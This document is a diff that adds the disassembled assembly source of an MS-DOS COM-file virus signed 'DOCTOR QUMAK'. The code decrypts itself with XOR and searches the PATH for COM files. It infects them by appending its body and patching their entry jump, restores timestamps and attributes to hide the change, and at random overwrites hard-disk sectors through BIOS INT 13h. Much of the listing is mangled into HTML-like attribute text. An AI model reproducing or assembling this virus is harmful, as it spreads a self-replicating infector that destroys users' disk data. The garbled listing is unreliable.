@@ -1,0 +1,104 @@
+﻿
+
+seg_a	segment	byte public
+	assume	cs:seg_a, ds:seg_a
+
+	org	100h
+
+start:	jmp	l_02F3						;0100  E9 01F0
+	db	6Bh,73h,0CAh,0Eh			;0103  6B 73 CA 0E
+
+
+	org	2F3h
+;----------------------------------------------
+l_02F3:	push	cx						;02F3  51
+	mov	dx,offset d_0683	;coded virus part addr	;02F4  BA 0683
+	nop							;02F7  90
+
+	;<--------- encoding="" push="" dx="" ;02f8="" 52="" pop="" bx="" ;02f9="" 5b="" mov="" cx,0f9h="" ;coded="" block="" length="" ;02fa="" b9="" 00f9="" mov="" si,dx="" ;02fd="" 8b="" f2="" dec="" si="" ;02ff="" 4e="" mov="" dl,[si]="" ;0300="" 8a="" 14="" inc="" si="" ;0302="" 46="" l_0303:="" mov="" al,[bx]="" ;encoding="" loop="" ;0303="" 8a="" 07="" xor="" al,dl="" ;0305="" 32="" c2="" nop="" ;0307="" 90="" mov="" [bx],al="" ;0308="" 88="" 07="" inc="" bx="" ;030a="" 43="" loop="" l_0303="" ;030b="" e2="" f6="" mov="" dx,si="" ;030d="" 8b="" d6=""></---------><----- restore="" changed="" bytes="" xor="" ax,ax="" ;030f="" 33="" c0="" xor="" bx,bx="" ;0311="" 33="" db="" cld="" ;0313="" fc="" mov="" si,dx="" ;0314="" 8b="" f2="" add="" si,0adh="" ;saved="" bytes="" address="" ;0316="" .81="" c6="" 00ad="" mov="" di,100h="" ;target="" address="" ;031a="" .bf="" 0100="" mov="" cx,7="" ;changed="" bytes="" ;031d="" b9="" 0007="" nop="" ;0320="" 90="" rep="" movsb="" ;0321="" f3/="" a4="" mov="" si,dx="" ;0323="" 8b="" f2="" mov="" byte="" ptr="" ds:[si+0f8h],0="" ;0325="" c6="" 84="" 00f8="" 00="" mov="" ah,30h="" ;get="" dos="" version="" number="" ax="" ;032a="" b4="" 30="" int="" 21h="" ;032c="" cd="" 21="" cmp="" al,0="" ;032e="" 3c="" 00="" nop="" ;0330="" 90="" jnz="" l_0335="" ;0331="" 75="" 02="" nop="" ;0333="" 90="" nop="" ;0334="" 90="" l_0335:="" mov="" bp,0bfh="" ;0335="" bd="" 00bf="" add="" bp,si="" ;0338="" 03="" ee="" mov="" byte="" ptr="" ds:[bp],0="" ;033a="" 3e:="" c6="" 46="" 00="" 00="" push="" es="" ;033f="" 06="" nop="" ;0340="" 90="" mov="" ah,2fh="" ;0341="" b4="" 2f="" int="" 21h="" ;="" dos="" services="" ah="function" 2fh="" ;0343="" cd="" 21="" ;="" get="" dta="" ptr="" into="" es:bx="" mov="" [si],bx="" ;0345="" 89="" 1c="" mov="" [si+2],es="" ;0347="" 8c="" 44="" 02="" pop="" es="" ;034a="" 07="" mov="" dx,5fh="" ;034b="" .ba="" 005f="" add="" dx,si="" ;034e="" 03="" d6="" mov="" ah,1ah="" ;0350="" b4="" 1a="" int="" 21h="" ;="" dos="" services="" ah="function" 1ah="" ;0352="" cd="" 21="" ;="" set="" dta="" to="" ds:dx="" push="" es="" ;0354="" 06="" push="" si="" ;0355="" 56="" mov="" es,ds:[2ch]="" ;0356="" 8e="" 06="" 002c="" mov="" di,0="" ;035a="" .bf="" 0000="" l_035d:="" pop="" si="" ;035d="" 5e="" push="" si="" ;035e="" 56="" add="" si,1ah="" ;035f="" 83="" c6="" 1a="" lodsb="" ;0362="" ac="" mov="" cx,8000h="" ;0363="" b9="" 8000="" repne="" scasb="" ;0366="" f2/="" ae="" mov="" cx,4="" ;0368="" b9="" 0004="" l_036b:="" lodsb="" ;036b="" ac="" scasb="" ;036c="" ae="" jnz="" l_035d="" ;036d="" 75="" ee="" loop="" l_036b="" ;036f="" e2="" fa="" pop="" si="" ;0371="" 5e="" pop="" es="" ;0372="" 07="" mov="" [si+16h],di="" ;0373="" 89="" 7c="" 16="" mov="" di,si="" ;0376="" 8b="" fe="" add="" di,1fh="" ;0378="" 83="" c7="" 1f="" mov="" bx,si="" ;037b="" 8b="" de="" add="" si,1fh="" ;037d="" 83="" c6="" 1f="" mov="" di,si="" ;0380="" 8b="" fe="" jmp="" short="" l_03ce="" ;0382="" eb="" 4a="" l_0384:="" cmp="" word="" ptr="" [si+16h],0="" ;0384="" 83="" 7c="" 16="" 00="" jne="" l_0392="" ;0388="" 75="" 08="" mov="" byte="" ptr="" ds:[si+0f8h],1="" ;038a="" c6="" 84="" 00f8="" 01="" jmp="" l_04e9="" ;038f="" e9="" 0157="" l_0392:="" push="" ds="" ;0392="" 1e="" push="" si="" ;0393="" 56="" mov="" bp,0bfh="" ;0394="" .bd="" 00bf="" add="" bp,si="" ;0397="" 03="" ee="" mov="" ds,es:[02ch]="" ;0399="" 26:="" 8e="" 1e="" 002c="" mov="" di,si="" ;039e="" 8b="" fe="" mov="" si,es:[di+16h]="" ;03a0="" 26:="" 8b="" 75="" 16="" add="" di,1fh="" ;03a4="" 83="" c7="" 1f="" l_03a7:="" lodsb="" ;03a7="" ac="" cmp="" al,3bh="" ;="" ';'="" ;03a8="" 3c="" 3b="" je="" l_03bb="" ;03aa="" 74="" 0f="" cmp="" al,0="" ;03ac="" 3c="" 00="" je="" l_03b8="" ;03ae="" 74="" 08="" mov="" es:[bp],al="" ;03b0="" 26:="" 88="" 46="" 00="" inc="" bp="" ;03b4="" 45="" stosb="" ;03b5="" aa="" jmp="" short="" l_03a7="" ;03b6="" eb="" ef="" l_03b8:="" mov="" si,0="" ;03b8="" .be="" 0000="" l_03bb:="" pop="" bx="" ;03bb="" 5b="" pop="" ds="" ;03bc="" 1f="" mov="" [bx+16h],si="" ;03bd="" 89="" 77="" 16="" cmp="" byte="" ptr="" [di-1],5ch="" ;="" '\'="" ;03c0="" 80="" 7d="" ff="" 5c="" je="" l_03ce="" ;03c4="" 74="" 08="" mov="" al,5ch="" ;="" '\'="" ;03c6="" b0="" 5c="" mov="" es:[bp],al="" ;03c8="" 26:="" 88="" 46="" 00="" inc="" bp="" ;03cc="" 45="" stosb="" ;03cd="" aa="" l_03ce:="" mov="" byte="" ptr="" es:[bp],0="" ;03ce="" 26:="" c6="" 46="" 00="" 00="" mov="" bp,0="" ;03d3="" bd="" 0000="" mov="" [bx+18h],di="" ;03d6="" 89="" 7f="" 18="" mov="" si,bx="" ;03d9="" 8b="" f3="" add="" si,10h="" ;03db="" 83="" c6="" 10="" mov="" cx,6="" ;03de="" b9="" 0006="" rep="" movsb="" ;03e1="" f3/="" a4="" mov="" si,bx="" ;03e3="" 8b="" f3="" mov="" ah,4eh="" ;="" 'n'="" ;03e5="" b4="" 4e="" mov="" dx,01fh="" ;03e7="" .ba="" 001f="" add="" dx,si="" ;03ea="" 03="" d6="" mov="" cx,3="" ;03ec="" b9="" 0003="" int="" 21h="" ;="" dos="" services="" ah="function" 4eh="" ;03ef="" cd="" 21="" ;="" find="" 1st="" filenam="" match="" @ds:dx="" jmp="" short="" l_0429="" ;03f1="" eb="" 36="" l_03f3:="" mov="" bp,0bfh="" ;03f3="" .bd="" 00bf="" add="" bp,si="" ;03f6="" 03="" ee="" push="" bp="" ;03f8="" 55="" mov="" ax,0="" ;03f9="" b8="" 0000="" dec="" bp="" ;03fc="" 4d="" l_03fd:="" inc="" bp="" ;03fd="" 45="" cmp="" byte="" ptr="" ds:[bp],5ch="" ;="" '\'="" ;03fe="" 3e:="" 80="" 7e="" 00="" 5c="" jne="" l_0407="" ;0403="" 75="" 02="" mov="" ax,bp="" ;0405="" 8b="" c5="" l_0407:="" cmp="" byte="" ptr="" ds:[bp],0="" ;0407="" 3e:="" 80="" 7e="" 00="" 00="" jne="" l_03fd="" ;040c="" 75="" ef="" cmp="" ax,0="" ;040e="" 3d="" 0000="" pop="" bp="" ;0411="" 5d="" jnz="" l_041b="" ;0412="" 75="" 07="" mov="" byte="" ptr="" ds:[bp],0="" ;0414="" 3e:="" c6="" 46="" 00="" 00="" jmp="" short="" l_0425="" ;0419="" eb="" 0a="" l_041b:="" mov="" bp,ax="" ;041b="" 8b="" e8="" mov="" byte="" ptr="" ds:[bp+1],0="" ;041d="" 3e:="" c6="" 46="" 01="" 00="" mov="" bp,0="" ;0422="" bd="" 0000="" l_0425:="" mov="" ah,4fh="" ;0425="" b4="" 4f="" int="" 21h="" ;="" dos="" services="" ah="function" 4fh="" ;0427="" cd="" 21="" ;="" find="" next="" filename="" match="" l_0429:="" jnc="" l_042e="" ;0429="" 73="" 03="" jmp="" l_0384="" ;042b="" e9="" ff56="" l_042e:="" mov="" bp,0bfh="" ;042e="" .bd="" 00bf="" add="" bp,si="" ;0431="" 03="" ee="" dec="" bp="" ;0433="" 4d="" l_0434:="" inc="" bp="" ;0434="" 45="" cmp="" byte="" ptr="" ds:[bp],0="" ;0435="" 3e:="" 80="" 7e="" 00="" 00="" jne="" l_0434="" ;043a="" 75="" f8="" mov="" di,bp="" ;043c="" 8b="" fd="" mov="" bp,0="" ;043e="" bd="" 0000="" push="" si="" ;0441="" 56="" add="" si,7dh="" ;0442="" 83="" c6="" 7d="" l_0445:="" lodsb="" ;0445="" ac="" stosb="" ;0446="" aa="" cmp="" al,0="" ;0447="" 3c="" 00="" jne="" l_0445="" ;0449="" 75="" fa="" pop="" si="" ;044b="" 5e="" mov="" dx,si="" ;044c="" 8b="" d6="" add="" dx,0bfh="" ;044e="" .81="" c2="" 00bf="" mov="" ax,3d00h="" ;0452="" b8="" 3d00="" int="" 21h="" ;="" dos="" services="" ah="function" 3dh="" ;0455="" cd="" 21="" ;="" open="" file,="" al="mode,name@ds:dx" jnc="" l_045c="" ;0457="" 73="" 03="" jmp="" l_0384="" ;0459="" e9="" ff28="" l_045c:="" mov="" bx,ax="" ;045c="" 8b="" d8="" mov="" dx,0b8h="" ;045e="" .ba="" 00b8="" add="" dx,si="" ;0461="" 03="" d6="" mov="" cx,7="" ;0463="" b9="" 0007="" mov="" ah,3fh="" ;0466="" b4="" 3f="" int="" 21h="" ;="" dos="" services="" ah="function" 3fh="" ;0468="" cd="" 21="" ;="" read="" file,="" cx="bytes," to="" ds:dx="" mov="" ah,3eh="" ;046a="" b4="" 3e="" int="" 21h="" ;="" dos="" services="" ah="function" 3eh="" ;046c="" cd="" 21="" ;="" close="" file,="" bx="file" handle="" mov="" di,0bbh="" ;046e="" .bf="" 00bb="" add="" di,si="" ;0471="" 03="" fe="" mov="" bx,0b4h="" ;0473="" .bb="" 00b4="" add="" bx,si="" ;0476="" 03="" de="" mov="" ax,[di]="" ;0478="" 8b="" 05="" cmp="" ax,[bx]="" ;047a="" 3b="" 07="" jne="" l_0489="" ;047c="" 75="" 0b="" mov="" ax,[di+2]="" ;047e="" 8b="" 45="" 02="" cmp="" ax,[bx+2]="" ;0481="" 3b="" 47="" 02="" jne="" l_0489="" ;0484="" 75="" 03="" l_0486:="" jmp="" l_03f3="" ;0486="" e9="" ff6a="" l_0489:="" cmp="" word="" ptr="" [si+79h],0fa00h="" ;0489="" 81="" 7c="" 79="" fa00="" nop="" ;048e="" 90="" ja="" l_0486="" ;048f="" 77="" f5="" cmp="" word="" ptr="" [si+79h],0ah="" ;0491="" 83="" 7c="" 79="" 0a="" jb="" l_0486="" ;0495="" 72="" ef="" mov="" di,[si+18h]="" ;0497="" 8b="" 7c="" 18="" push="" si="" ;049a="" 56="" add="" si,7dh="" ;049b="" 83="" c6="" 7d="" l_049e:="" lodsb="" ;049e="" ac="" stosb="" ;049f="" aa="" cmp="" al,0="" ;04a0="" 3c="" 00="" jne="" l_049e="" ;04a2="" 75="" fa="" pop="" si="" ;04a4="" 5e="" mov="" ax,4300h="" ;04a5="" b8="" 4300="" mov="" dx,01fh="" ;04a8="" .ba="" 001f="" push="" si="" ;04ab="" 56="" pop="" si="" ;04ac="" 5e="" add="" dx,si="" ;04ad="" 03="" d6="" int="" 21h="" ;="" dos="" services="" ah="function" 43h="" ;04af="" cd="" 21="" ;="" get/set="" file="" attrb,="" nam@ds:dx="" mov="" [si+8],cx="" ;04b1="" 89="" 4c="" 08="" mov="" ax,4301h="" ;04b4="" b8="" 4301="" and="" cl,0feh="" ;04b7="" 80="" e1="" fe="" mov="" dx,01fh="" ;04ba="" .ba="" 001f="" add="" dx,si="" ;04bd="" 03="" d6="" int="" 21h="" ;="" dos="" services="" ah="function" 43h="" ;04bf="" cd="" 21="" ;="" get/set="" file="" attrb,="" nam@ds:dx="" mov="" ax,3d02h="" ;04c1="" b8="" 3d02="" mov="" dx,01fh="" ;04c4="" .ba="" 001f="" add="" dx,si="" ;04c7="" 03="" d6="" int="" 21h="" ;="" dos="" services="" ah="function" 3dh="" ;04c9="" cd="" 21="" ;="" open="" file,="" al="mode,name@ds:dx" jnc="" l_04d0="" ;04cb="" 73="" 03="" jmp="" l_0638="" ;04cd="" e9="" 0168="" l_04d0:="" mov="" bx,ax="" ;04d0="" 8b="" d8="" mov="" ax,5700h="" ;04d2="" b8="" 5700="" int="" 21h="" ;="" dos="" services="" ah="function" 57h="" ;04d5="" cd="" 21="" ;="" get/set="" file="" date="" &="" time="" mov="" [si+4],cx="" ;04d7="" 89="" 4c="" 04="" mov="" [si+6],dx="" ;04da="" 89="" 54="" 06="" mov="" ah,2ch="" ;="" ','="" ;04dd="" b4="" 2c="" int="" 21h="" ;="" dos="" services="" ah="function" 2ch="" ;04df="" cd="" 21="" ;="" get="" time,="" cx="hrs/min," dh="sec" and="" dh,7="" ;04e1="" 80="" e6="" 07="" jz="" l_04e9="" ;04e4="" 74="" 03="" jmp="" l_0572="" ;04e6="" e9="" 0089="" l_04e9:="" push="" bx="" ;04e9="" 53="" push="" si="" ;04ea="" 56="" mov="" ah,8="" ;04eb="" b4="" 08="" mov="" dl,80h="" ;04ed="" b2="" 80="" int="" 13h="" ;="" disk="" dl="drive" 0="" ah="func" 08h="" ;04ef="" cd="" 13="" ;="" read="" parameters="" for="" drive="" dl="" cmp="" dl,0="" ;04f1="" 80="" fa="" 00="" je="" l_0562="" ;04f4="" 74="" 6c="" mov="" al,cl="" ;04f6="" 8a="" c1="" and="" al,3fh="" ;="" '?'="" ;04f8="" 24="" 3f="" mov="" ds:[si+0f4h],al="" ;04fa="" 88="" 84="" 00f4="" mov="" al,ch="" ;04fe="" 8a="" c5="" mov="" ah,cl="" ;0500="" 8a="" e1="" and="" ah,0c0h="" ;0502="" 80="" e4="" c0="" mov="" cl,6="" ;0505="" b1="" 06="" shr="" ah,cl="" ;0507="" d2="" ec="" mov="" ds:[si+0f1h],ax="" ;0509="" 89="" 84="" 00f1="" mov="" ds:[si+0f3h],dh="" ;050d="" 88="" b4="" 00f3="" l_0511:="" mov="" ah,2ch="" ;="" ','="" ;0511="" b4="" 2c="" int="" 21h="" ;="" dos="" services="" ah="function" 2ch="" ;0513="" cd="" 21="" ;="" get="" time,="" cx="hrs/min," dh="sec" shr="" dl,1="" ;0515="" d0="" ea="" shr="" dl,1="" ;0517="" d0="" ea="" and="" dl,7="" ;0519="" 80="" e2="" 07="" cmp="" dl,ds:[si+0f3h]="" ;051c="" 3a="" 94="" 00f3="" ja="" l_0511="" ;0520="" 77="" ef="" mov="" ds:[si+0f7h],dl="" ;0522="" 88="" 94="" 00f7="" push="" ds="" ;0526="" 1e="" mov="" ax,0="" ;0527="" b8="" 0000="" mov="" ds,ax="" ;052a="" 8e="" d8="" mov="" bx,046ch="" ;052c="" .bb="" 046c="" mov="" ax,[bx]="" ;052f="" 8b="" 07="" mov="" dx,[bx+2]="" ;0531="" 8b="" 57="" 02="" pop="" ds="" ;0534="" 1f="" div="" word="" ptr="" ds:[si+0f1h]="" ;0535="" f7="" b4="" 00f1="" l_0539:="" cmp="" dx,ds:[si+0f1h]="" ;0539="" 3b="" 94="" 00f1="" jbe="" l_0543="" ;053d="" 76="" 04="" shr="" dx,1="" ;053f="" d1="" ea="" jmp="" short="" l_0539="" ;0541="" eb="" f6="" l_0543:="" mov="" ds:[si+0f5h],dx="" ;0543="" 89="" 94="" 00f5="" mov="" ax,dx="" ;0547="" 8b="" c2="" mov="" dl,80h="" ;0549="" b2="" 80="" mov="" dh,ds:[si+0f7h]="" ;054b="" 8a="" b4="" 00f7="" mov="" ch,al="" ;054f="" 8a="" e8="" mov="" cl,6="" ;0551="" b1="" 06="" shl="" ah,cl="" ;0553="" d2="" e4="" mov="" cl,ah="" ;0555="" 8a="" cc="" mov="" ah,3="" ;0557="" b4="" 03="" or="" cl,1="" ;0559="" 80="" c9="" 01="" mov="" al,ds:[si+0f4h]="" ;055c="" 8a="" 84="" 00f4="" int="" 13h="" ;="" disk="" dl="drive" 0="" ah="func" 03h="" ;0560="" cd="" 13="" ;="" write="" sectors="" from="" mem="" es:bx="" l_0562:="" pop="" si="" ;0562="" 5e="" pop="" bx="" ;0563="" 5b="" cmp="" byte="" ptr="" ds:[si+0f8h],0="" ;0564="" 80="" bc="" 00f8="" 00="" je="" l_056e="" ;0569="" 74="" 03="" jmp="" l_0647="" ;056b="" e9="" 00d9="" l_056e:="" jmp="" l_0628="" ;056e="" e9="" 00b7="" db="" 90h="" ;0571="" 90="" l_0572:="" mov="" ah,3fh="" ;="" '?'="" ;0572="" b4="" 3f="" mov="" cx,7="" ;0574="" b9="" 0007="" mov="" dx,0adh="" ;0577="" .ba="" 00ad="" add="" dx,si="" ;057a="" 03="" d6="" int="" 21h="" ;="" dos="" services="" ah="function" 3fh="" ;057c="" cd="" 21="" ;="" read="" file,="" cx="bytes," to="" ds:dx="" jnc="" l_0583="" ;057e="" 73="" 03="" jmp="" l_0628="" ;0580="" e9="" 00a5="" l_0583:="" cmp="" ax,7="" ;0583="" 3d="" 0007="" je="" l_058b="" ;0586="" 74="" 03="" jmp="" l_0628="" ;0588="" e9="" 009d="" l_058b:="" mov="" ax,4202h="" ;058b="" b8="" 4202="" mov="" cx,0="" ;058e="" b9="" 0000="" mov="" dx,0="" ;0591="" ba="" 0000="" int="" 21h="" ;="" dos="" services="" ah="function" 42h="" ;0594="" cd="" 21="" ;="" move="" file="" ptr,="" cx,dx="offset" jnc="" l_059b="" ;0596="" 73="" 03="" jmp="" l_0628="" ;0598="" e9="" 008d="" l_059b:="" mov="" cx,ax="" ;059b="" 8b="" c8="" sub="" ax,3="" ;059d="" 2d="" 0003="" mov="" [si+0eh],ax="" ;05a0="" 89="" 44="" 0e="" add="" cx,490h="" ;05a3="" 81="" c1="" 0490="" mov="" di,si="" ;05a7="" 8b="" fe="" sub="" di,38eh="" ;05a9="" 81="" ef="" 038e="" mov="" [di],cx="" ;05ad="" 89="" 0d="" mov="" ah,40h="" ;="" '@'="" ;05af="" b4="" 40="" mov="" cx,489h="" ;05b1="" b9="" 0489="" mov="" dx,si="" ;05b4="" 8b="" d6="" sub="" dx,390h="" ;05b6="" 81="" ea="" 0390="" push="" dx="" ;05ba="" 52="" push="" cx="" ;05bb="" 51="" push="" bx="" ;05bc="" 53="" push="" ax="" ;05bd="" 50="" mov="" ah,2ch="" ;="" ','="" ;05be="" b4="" 2c="" int="" 21h="" ;="" dos="" services="" ah="function" 2ch="" ;05c0="" cd="" 21="" ;="" get="" time,="" cx="hrs/min," dh="sec" mov="" dl,cl="" ;05c2="" 8a="" d1="" add="" dl,dh="" ;05c4="" 02="" d6="" add="" dl,82h="" ;05c6="" 80="" c2="" 82="" mov="" [si-1],dl="" ;05c9="" 88="" 54="" ff="" mov="" bx,si="" ;05cc="" 8b="" de="" mov="" cx,0f9h="" ;05ce="" b9="" 00f9="" l_05d1:="" mov="" al,[bx]="" ;05d1="" 8a="" 07="" xor="" al,dl="" ;05d3="" 32="" c2="" mov="" [bx],al="" ;05d5="" 88="" 07="" inc="" bx="" ;05d7="" 43="" loop="" l_05d1="" ;05d8="" e2="" f7="" pop="" ax="" ;05da="" 58="" pop="" bx="" ;05db="" 5b="" pop="" cx="" ;05dc="" 59="" pop="" dx="" ;05dd="" 5a="" int="" 21h="" ;="" dos="" services="" ah="function" 40h="" ;05de="" cd="" 21="" ;="" write="" file="" cx="bytes," to="" ds:dx="" push="" dx="" ;05e0="" 52="" push="" cx="" ;05e1="" 51="" push="" bx="" ;05e2="" 53="" push="" ax="" ;05e3="" 50="" mov="" bx,si="" ;05e4="" 8b="" de="" mov="" cx,0f9h="" ;05e6="" b9="" 00f9="" mov="" dl,[si-1]="" ;05e9="" 8a="" 54="" ff="" l_05ec:="" mov="" al,[bx]="" ;05ec="" 8a="" 07="" xor="" al,dl="" ;05ee="" 32="" c2="" nop="" ;05f0="" 90="" mov="" [bx],al="" ;05f1="" 88="" 07="" inc="" bx="" ;05f3="" 43="" loop="" l_05ec="" ;05f4="" e2="" f6="" pop="" ax="" ;05f6="" 58="" pop="" bx="" ;05f7="" 5b="" pop="" cx="" ;05f8="" 59="" pop="" dx="" ;05f9="" 5a="" jc="" l_0628="" ;05fa="" 72="" 2c="" cmp="" ax,489h="" ;05fc="" 3d="" 0489="" jne="" l_0628="" ;05ff="" 75="" 27="" mov="" ax,4200h="" ;0601="" b8="" 4200="" nop="" ;0604="" 90="" mov="" cx,0="" ;0605="" b9="" 0000="" mov="" dx,0="" ;0608="" ba="" 0000="" int="" 21h="" ;="" dos="" services="" ah="function" 42h="" ;060b="" cd="" 21="" ;="" move="" file="" ptr,="" cx,dx="offset" jc="" l_0628="" ;060d="" 72="" 19="" mov="" ah,40h="" ;="" '@'="" ;060f="" b4="" 40="" mov="" cx,3="" ;0611="" b9="" 0003="" mov="" dx,si="" ;0614="" 8b="" d6="" add="" dx,0dh="" ;0616="" 83="" c2="" 0d="" int="" 21h="" ;="" dos="" services="" ah="function" 40h="" ;0619="" cd="" 21="" ;="" write="" file="" cx="bytes," to="" ds:dx="" mov="" cx,4="" ;061b="" b9="" 0004="" mov="" dx,si="" ;061e="" 8b="" d6="" add="" dx,0b4h="" ;0620="" .81="" c2="" 00b4="" mov="" ah,40h="" ;="" '@'="" ;0624="" b4="" 40="" int="" 21h="" ;="" dos="" services="" ah="function" 40h="" ;0626="" cd="" 21="" ;="" write="" file="" cx="bytes," to="" ds:dx="" l_0628:="" mov="" dx,[si+6]="" ;0628="" 8b="" 54="" 06="" nop="" ;062b="" 90="" mov="" cx,[si+4]="" ;062c="" 8b="" 4c="" 04="" mov="" ax,5701h="" ;062f="" b8="" 5701="" int="" 21h="" ;="" dos="" services="" ah="function" 57h="" ;0632="" cd="" 21="" ;="" get/set="" file="" date="" &="" time="" mov="" ah,3eh="" ;="" '="">'		;0634  B4 3E
+	int	21h		; DOS Services  ah=function 3Eh	;0636  CD 21
+				;  close file, bx=file handle
+l_0638:	mov	ax,4301h				;0638  B8 4301
+	mov	cx,[si+8]				;063B  8B 4C 08
+	mov	dx,01Fh					;063E .BA 001F
+	nop						;0641  90
+	add	dx,si					;0642  03 D6
+	nop						;0644  90
+	int	21h		; DOS Services  ah=function 43h	;0645  CD 21
+				;  get/set file attrb, nam@ds:dx
+l_0647:	push	ds					;0647  1E
+	mov	ah,1Ah					;0648  B4 1A
+	mov	dx,[si]					;064A  8B 14
+	mov	ds,[si+2]				;064C  8E 5C 02
+	int	21h		; DOS Services  ah=function 1Ah	;064F  CD 21
+				;  set DTA to ds:dx
+	pop	ds					;0651  1F
+	pop	cx					;0652  59
+	xor	ax,ax					;0653  33 C0
+	xor	bx,bx					;0655  33 DB
+	xor	dx,dx					;0657  33 D2
+	xor	si,si					;0659  33 F6
+	nop						;065B  90
+	mov	di,offset ds:[100h]			;065C .BF 0100
+	nop						;065F  90
+	push	di					;0660  57
+	nop						;0661  90
+	xor	di,di					;0662  33 FF
+	retn						;0664  C3
+
+	db	1,2,3					;0665  01 02 03
+	db	1,2,3					;0668  01 02 03
+	db	4,5,6					;066B  04 05 06
+
+	db	0Dh,0Ah					;066E  0D 0A
+	db	'(C) DOCTOR QUMAK'			;0670  28 43 29 20 44 4F 43 54
+							;0678  4F 52 20 51 55 4D 41 4B
+	db	0Dh,0Ah					;0680  0D 0A
+	
+	db	0B6h		;klucz kodowania	;0682  B6
+
+d_0683:	db	 36h,0B6h,01Dh,0A6h, 59h, 2Dh		;0683  36 B6 1D A6 59 2D
+	db	 31h,0A3h, 96h,0B6h, 5Fh, 4Fh		;0689  31 A3 96 B6 5F 4F
+	db	0B6h, 5Fh, 46h,0B7h, 9Ch, 98h		;068F  B6 5F 46 B7 9C 98
+	db	0F5h,0F9h,0FBh,0B6h, 9Ch,0B6h		;0695  F5 F9 FB B6 9C B6
+	db	 3Dh,0D1h,0E6h,0F7h,0E2h,0FEh		;069B  3D D1 E6 F7 E2 FE
+	db	 8Bh,0F5h,0E5h, 98h,0F5h,0F9h		;06A1  8B F5 E5 98 F5 F9
+	db	0FBh,0B6h, 98h,0F5h,0F9h,0FBh		;06A7  FB B6 98 F5 F9 FB
+	db	0B6h,0E2h, 98h,0F5h,0F9h,0FBh		;06AD  B6 E2 98 F5 F9 FB
+	db	0B6h,0F9h,0FBh,0B6h, 96h		;06B3  B6 F9 FB B6 96
+	db	42 dup (96h)				;06B8  002A[96]
+	db	0B2h, 89h				;06E2  B2 89
+	db	7 dup (89h)				;06E4  0007[89]
+	db	0F5h,0F9h,0FBh,0B5h,0A2h,0B6h		;06EB  F5 F9 FB B5 A2 B6
+	db	0E7h,0B7h,0B6h,0B6h,0B6h,0B6h		;06F1  E7 B7 B6 B6 B6 B6
+	db	 96h, 59h, 2Dh, 31h,0A3h, 45h		;06F7  96 59 2D 31 A3 45
+	db	0B7h,0B6h,0B6h,0F5h,0E5h, 98h		;06FD  B7 B6 B6 F5 E5 98
+	db	0F5h,0F9h,0FBh,0B6h, 96h,0F5h		;0703  F5 F9 FB B6 96 F5
+	db	0F9h,0FBh,0B6h,0B6h, 5Ch, 46h		;0709  F9 FB B6 B6 5C 46
+	db	 49h,0B6h, 46h,0FEh,0D3h,0DAh		;070F  49 B6 46 FE D3 DA
+	db	0DAh,0D9h, 96h,0C1h,0D9h,0C4h		;0715  DA D9 96 C1 D9 C4
+	db	0DAh,0D2h, 96h,0D0h,0C4h,0D9h		;071B  DA D2 96 D0 C4 D9
+	db	0DBh, 96h,0DBh,0CFh, 96h,0C0h		;0721  DB 96 DB CF 96 C0
+	db	0DFh,0C4h,0C3h,0C5h, 96h, 97h		;0727  DF C4 C3 C5 96 97
+	db	0BBh,0BCh, 92h, 5Dh,0B6h,0A8h		;072D  BB BC 92 5D B6 A8
+	db	 0Eh,0B6h,0B6h,0E6h,0DDh,0C5h		;0733  0E B6 B6 E6 DD C5
+	db	 7Ch,0B8h, 5Dh,0B6h,0A8h, 0Eh		;0739  7C B8 5D B6 A8 0E
+	db	0B6h,0B6h,0E6h,0F5h,0E5h, 98h		;073F  B6 B6 E6 F5 E5 98
+	db	0F5h,0F9h,0FBh,0B6h, 98h,0F5h		;0745  F5 F9 FB B6 98 F5
+	db	0F9h,0FBh,0B6h,0E2h, 98h,0F5h		;074B  F9 FB B6 E2 98 F5
+	db	0F9h,0FBh,0B6h,0FBh,0B6h, 96h		;0751  F9 FB B6 FB B6 96
+	db	0C2h,0DEh,0D3h, 96h,0C5h,0C2h		;0757  C2 DE D3 96 C5 C2
+	db	0C3h,0D0h,0D0h, 96h,0C2h,0DEh		;075D  C3 D0 D0 96 C2 DE
+	db	0D7h,0C2h, 96h,0C5h,0DEh,0D9h		;0763  D7 C2 96 C5 DE D9
+	db	0C3h,0DAh,0D2h, 96h,0D4h,0D3h		;0769  C3 DA D2 96 D4 D3
+	db	 96h,0DEh,0D3h,0C4h,0D3h,0B6h		;076F  96 DE D3 C4 D3 B6
+	db	0B6h,0B6h,0B6h,0B6h,0B6h,0B6h		;0775  B6 B6 B6 B6 B6 B6
+	db	0B6h					;077B  B6
+
+seg_a	ends
+
+
+
+	end	start
+
+</----->
